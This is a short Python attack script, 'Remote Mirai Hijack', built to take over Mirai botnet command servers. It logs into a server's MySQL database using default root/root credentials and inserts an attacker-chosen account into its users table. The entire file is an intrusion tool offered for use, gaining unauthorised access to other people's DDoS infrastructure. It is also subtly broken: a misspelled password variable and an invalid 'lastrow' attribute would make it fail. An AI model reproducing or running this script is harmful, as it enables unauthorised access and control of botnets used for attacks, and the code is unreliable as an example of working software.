# Project Name: Remote Mirai Hijack (RMH)
# Project Author: VoidLSD
# Project Reason: Remote Mirai Hijack was made to hijack mirais using a vulnerability that is often overlooked by DDoS script kiddies.

import mysql.connector
import os

os.system("clear")

intro = """
 ██████╗ ███╗   ███╗██╗  ██╗
 ██╔══██╗████╗ ████║██║  ██║
 ██████╔╝██╔████╔██║███████║
 ██╔══██╗██║╚██╔╝██║██╔══██║
 ██║  ██║██║ ╚═╝ ██║██║  ██║
 ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
    Remote Mirai Hijack
    Created by VoidLSD
      Mirai Variant:
 ╔─────────────────────────╗
 │ Mana, HoHo, Rift, Kuria │
 ╚─────────────────────────╝
"""
print(intro)
variant = input("Variant: ")


mirai = input(('IP of Mirai: '))
username = input(('Username Insert: '))
paswordy = input(('Password Insert: '))

mydb = mysql.connector.connect(
   host = mirai,
   user ='root',
   password ='root',
   database = variant
	)

mycursor = mydb.cursor()

sql = "INSERT INTO users (username, password) VALUES (%s, %s)"
val = (username, passwordy)

mycursor.execute(sql, val)

mydb.commit()

print("Remote Mirai Hijack has successfully been ran! ID:", mycursor.lastrow)
print("Username and Password inserted into the table:"+username+passwordy)
